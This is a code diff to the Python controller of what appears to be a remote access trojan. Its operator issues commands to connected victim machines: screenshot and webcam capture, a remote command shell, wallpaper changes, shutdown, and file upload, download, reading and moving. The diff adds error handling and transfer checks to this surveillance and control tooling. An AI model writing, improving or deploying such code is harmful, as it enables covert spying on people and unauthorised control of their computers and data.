@@ -137,6 +137,9 @@ def CaptureScreenshot():
     print("\nScreenshot Captured")
     try:
         fileContent = recvAll_Verbose(recv(buffer))
+        if (fileContent == b"bad_alloc"):
+            raise MemoryError("Bad Allocation Error - File May be too Large")
+
         with open(time.strftime(f"{PC_Name}-%Y-%m-%d-%H%M%S.png"), "wb") as ImageFile:
             ImageFile.write(fileContent)
 
@@ -145,8 +148,10 @@ def CaptureScreenshot():
             "{:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
             len(fileContent) / 1024, len(fileContent), end - start))
 
-    except:
-        print("[!] Error Receiving File\n")
+    except MemoryError as e:
+        print(e)
+
+    except: print("[!] Error Receiving File\n")
 
 def CaptureWebcam():
     send("webcam")
@@ -191,6 +196,9 @@ def CaptureWebcam():
     print("\nWebcam Captured")
     try:
         fileContent = recvAll_Verbose(recv(buffer))
+        if (fileContent == b"bad_alloc"):
+            raise MemoryError("Bad Allocation - File is too Large\n")
+
         with open(time.strftime(f"{PC_Name}-%Y-%m-%d-%H%M%S.avi"), "wb") as ImageFile:
             ImageFile.write(fileContent)
 
@@ -199,8 +207,10 @@ def CaptureWebcam():
             "{:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
             len(fileContent) / 1024, len(fileContent), end - start))
 
-    except:
-        print("[!] Error Receiving File\n")
+    except MemoryError as e:
+        print(e)
+
+    except: print("[!] Error Receiving File\n")
 
 def ChangeWallpaper():
     localFile = input("\nChoose Local Image File: ").strip()
@@ -221,6 +231,11 @@ def ChangeWallpaper():
 
     print("Sending Image...")
     sendAll(fileContent)
+
+    if not (str(recv(buffer), "utf-8") == "received"):
+        print("[!] Unable to Transfer Image\n")
+        return
+
     print("Wallpaper Changed\n")
 
 def SystemInformation():
@@ -263,27 +278,31 @@ def RemoteCMD():
     remoteDirectory = str(recv(buffer), "utf-8")
 
     while (True):
-        command = input(f"\n({IP_Address} ~ {remoteDirectory})> ").strip().lower()
-        if (command == "exit"):
-            send(command); print("<Exited Remote CMD>\n")
+        try:
+            command = input(f"\n({IP_Address} ~ {remoteDirectory})> ").strip().lower()
+            if (command == "exit"):
+                raise KeyboardInterrupt
+
+            elif (command == "cls" or command == "clear"):
+                os.system("clear" if os.name == "posix" else "cls")
+
+            elif ("start" in command or "tree" in command or "cd" in command or 
+                    "cmd" in command or "powershell" in command):
+
+                print("[!] Unable to use this Command")
+
+            elif (len(command) > 0):
+                send(command)
+                output = str(recvAll(recv(buffer)), "utf-8")
+
+                if (len(output) == 0):
+                    print("No Output ~ Command Executed")
+                else:
+                    print(output, end="")
+
+        except KeyboardInterrupt:
+            send("exit"); print("<Exited Remote CMD>\n")
             break
-
-        elif (command == "cls" or command == "clear"):
-            os.system("clear" if os.name == "posix" else "cls")
-
-        elif ("start" in command or "tree" in command or "cd" in command or 
-                "cmd" in command or "powershell" in command):
-
-            print("[!] Unable to use this Command")
-
-        elif (len(command) > 0):
-            send(command)
-            output = str(recvAll(recv(buffer)), "utf-8")
-
-            if (len(output) == 0):
-                print("No Output ~ Command Executed")
-            else:
-                print(output, end="")
 
 def ShutdownComputer():
     send("shutdown")
@@ -323,7 +342,7 @@ def ViewFiles():
             pass
 
     if (fileCount <= 0):
-        print("[!] Nothing Found\n")
+        print("[!] No Results\n")
     else:
         print("File Count: [{:,}]\nCharacter Count: [{:,}]\n\n{}".format(fileCount, len(files), files), end="")
 
@@ -341,8 +360,14 @@ def SendFile():
         fileContent = file.read()
         
     start = time.time()
+
     print("Sending File...")
     sendAll(fileContent)
+
+    if not (str(recv(buffer), "utf-8") == "received"):
+        print("[!] Unable to Transfer File\n")
+        return
+
     end = time.time()
     
     print("\nFile Sent: [{}]\nSize: {:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
@@ -362,6 +387,8 @@ def ReceiveFile():
     try:
         fileContent = recvAll_Verbose(recv(buffer))
         fileName = filePath.split("\\")[-1]
+        if (fileContent == b"bad_alloc"):
+            raise MemoryError("Bad Allocation - File is too Large\n")
 
         with open(fileName, "wb") as RemoteFile:
             RemoteFile.write(fileContent)
@@ -369,6 +396,9 @@ def ReceiveFile():
         end = time.time()
         print("\n\nFile Received: [{}]\nSize: {:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
             fileName, len(fileContent) / 1024, len(fileContent), end - start))
+
+    except MemoryError as e:
+        print(e)
     
     except: print("[!] Error Receiving File\n")
 
@@ -386,6 +416,8 @@ def ReadFile():
     try:
         fileContent = recvAll_Verbose(recv(buffer))
         fileName = filePath.split("\\")[-1]
+        if (fileContent == b"bad_alloc"):
+            raise MemoryError("Bad Allocation - File is too Large\n")
 
         end = time.time()
         print("\n\nFile Read: [{}]\nSize: {:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
@@ -398,8 +430,10 @@ def ReadFile():
         with open(fileName, "wb") as RemoteFile:
             RemoteFile.write(fileContent)
 
-    except:
-        print("[!] Error Reading File\n")
+    except MemoryError as e:
+        print(e)
+
+    except: print("[!] Error Reading File\n")
 
 def MoveFile():
     send("move")
@@ -487,14 +521,14 @@ def SelectConnection():
                     except ConnectionResetError:
                         temp.append(client)
 
-                for d_client in temp:
-                    dead = int(clients.index(d_client))
+                for deadClient in temp:
+                    dead = int(clients.index(deadClient))
 
-                    if (d_client in clients):
+                    if (deadClient in clients):
                         table.del_row(dead)
-                        clients.remove(d_client)
+                        clients.remove(deadClient)
                         del(clientInfo[dead])
-                        d_client.close()
+                        deadClient.close()
                 
                 adjustTable()
                 if not (len([t for t in table]) == 0):
@@ -560,7 +594,7 @@ def SelectConnection():
         except (ValueError, IndexError):
             print("Invalid Connection ID")
 
-        except ConnectionAbortedError:
+        except (ConnectionAbortedError, BrokenPipeError):
             print("[Clients Timed Out] - Reconnecting...")
             for client in clients:
                 client.close()
